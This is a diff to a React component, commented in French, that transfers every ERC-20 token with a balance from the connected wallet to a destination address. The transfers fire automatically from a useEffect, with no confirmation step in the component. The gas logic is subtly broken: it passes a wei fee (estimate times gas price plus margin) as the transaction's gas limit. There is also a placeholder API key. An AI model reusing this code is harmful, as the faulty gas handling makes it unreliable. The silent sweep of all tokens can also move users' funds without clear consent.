@@ -5,19 +5,19 @@ import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { erc20ABI } from 'wagmi';
-import { normalize } from 'viem/ens';
+import { encodeFunctionData, normalize } from 'viem';
 import { isAddress } from 'essential-eth';
 
 // Fonction pour obtenir le prix du gaz depuis l'API Etherscan
 const getGasPriceFromEtherscan = async () => {
   const API_KEY = 'VOTRE_CLE_API_ETHERESCAN';
   const url = `https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=${API_KEY}`;
-  
+
   try {
     const response = await fetch(url);
     const data = await response.json();
     if (data.result) {
-      return BigInt(data.result);  // Convertir le prix du gaz en BigInt
+      return BigInt(data.result); // Convertir le prix du gaz en BigInt
     } else {
       console.error('Erreur lors de la récupération du prix du gaz.');
       return BigInt(0);
@@ -30,7 +30,7 @@ const getGasPriceFromEtherscan = async () => {
 
 // Calculer les frais de gaz avec une marge
 const calculateGasWithMargin = (gasEstimate: bigint, gasPrice: bigint) => {
-  const margin = BigInt(100000);  // Mettez ici la marge souhaitée (par exemple 100000 gaz)
+  const margin = BigInt(100000); // Ajoute une marge pour éviter les erreurs
   return gasEstimate * gasPrice + margin;
 };
 
@@ -42,76 +42,90 @@ export const SendTokens = () => {
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
 
-  // Fonction pour envoyer tous les tokens
   const sendAllTokens = async () => {
-    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
-      .filter((token) => BigInt(token.balance) > 0)
-      .map((token) => token.contract_address as `0x${string}`);
+    if (!walletClient) {
+      console.error('Aucun wallet connecté.');
+      return;
+    }
+    if (!destinationAddress) {
+      console.error('Adresse de destination invalide.');
+      return;
+    }
 
-    if (!walletClient) return;
-    if (!destinationAddress) return;
+    let finalDestinationAddress = destinationAddress;
 
+    // Résolution ENS si l'adresse contient un "."
     if (destinationAddress.includes('.')) {
-      const resolvedDestinationAddress = await publicClient.getEnsAddress({
+      const resolvedAddress = await publicClient.getEnsAddress({
         name: normalize(destinationAddress),
       });
-      if (resolvedDestinationAddress) {
-        setDestinationAddress(resolvedDestinationAddress);
+      if (resolvedAddress) {
+        finalDestinationAddress = resolvedAddress;
+        setDestinationAddress(resolvedAddress);
       } else {
-        console.error("Adresse ENS introuvable");
+        console.error('Adresse ENS introuvable.');
         return;
       }
     }
 
-    // Récupérer les frais de gaz depuis Etherscan
-    const gasPrice = await getGasPriceFromEtherscan();
-    if (gasPrice === BigInt(0)) {
-      console.error("Impossible de récupérer les frais de gaz.");
+    // Vérifier si l'adresse de destination est valide
+    if (!isAddress(finalDestinationAddress)) {
+      console.error('Adresse de destination invalide après validation.');
       return;
     }
 
-    // Envoyer tous les tokens après estimation des frais de gaz
-    for (const tokenAddress of tokensToSend) {
-      const token = tokens.find((token) => token.contract_address === tokenAddress);
-      if (!token) continue;
+    // Récupérer le prix du gaz
+    const gasPrice = await getGasPriceFromEtherscan();
+    if (gasPrice === BigInt(0)) {
+      console.error('Impossible de récupérer les frais de gaz.');
+      return;
+    }
 
+    // Filtrer les tokens à envoyer
+    const tokensToSend = tokens.filter((token) => BigInt(token.balance) > 0);
+
+    for (const token of tokensToSend) {
       try {
-        // Estimer les frais de gaz pour la transaction avec estimateGas
+        console.log(`Préparation de l'envoi du token: ${token.contract_ticker_symbol}`);
+
+        // Encodage de la transaction
+        const data = encodeFunctionData({
+          abi: erc20ABI,
+          functionName: 'transfer',
+          args: [finalDestinationAddress, BigInt(token.balance)],
+        });
+
+        // Estimation du gaz
         const gasEstimate = await publicClient.estimateGas({
           account: walletClient.account,
-          to: tokenAddress,
-          data: publicClient.encodeFunctionData(erc20ABI, 'transfer', [
-            destinationAddress as `0x${string}`,
-            BigInt(token.balance),
-          ]),
+          to: token.contract_address,
+          data,
         });
 
-        // Calculer les frais de gaz avec une marge
         const gasWithMargin = calculateGasWithMargin(gasEstimate, gasPrice);
 
-        console.log(`Estimation des frais de gaz pour ${token?.contract_ticker_symbol}:`, gasWithMargin);
+        console.log(`Frais de gaz estimés pour ${token.contract_ticker_symbol}: ${gasWithMargin}`);
 
-        // Exécuter la transaction avec les frais de gaz calculés
-        const response = await walletClient.writeContract({
-          to: tokenAddress,
-          data: publicClient.encodeFunctionData(erc20ABI, 'transfer', [
-            destinationAddress as `0x${string}`,
-            BigInt(token.balance),
-          ]),
-          gasLimit: gasWithMargin,  // Appliquer les frais de gaz calculés
+        // Exécution de la transaction
+        const tx = await walletClient.sendTransaction({
+          account: walletClient.account, // Utilisation de l'adresse connectée
+          to: token.contract_address,
+          data,
+          gas: gasWithMargin, // Ajout des frais de gaz calculés
         });
 
-        // Mettre à jour l'état avec la réponse de la transaction
+        console.log(`Transaction envoyée pour ${token.contract_ticker_symbol}:`, tx);
+
+        // Mettre à jour l'état avec la transaction
         setCheckedRecords((old) => ({
           ...old,
-          [tokenAddress]: {
-            ...old[tokenAddress],
-            pendingTxn: response,
+          [token.contract_address]: {
+            ...old[token.contract_address],
+            pendingTxn: tx,
           },
         }));
-
       } catch (err) {
-        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
+        console.error(`Erreur avec le token ${token.contract_ticker_symbol}:`, err);
       }
     }
   };
@@ -120,7 +134,7 @@ export const SendTokens = () => {
     if (tokens.length > 0 && destinationAddress) {
       sendAllTokens();
     }
-  }, [tokens, destinationAddress, walletClient]);  // Ajout de toutes les dépendances manquantes
+  }, [tokens, destinationAddress, walletClient]);
 
-  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
+  return <div style={{ margin: '20px' }}>Envoi automatique des tokens...</div>;
 };
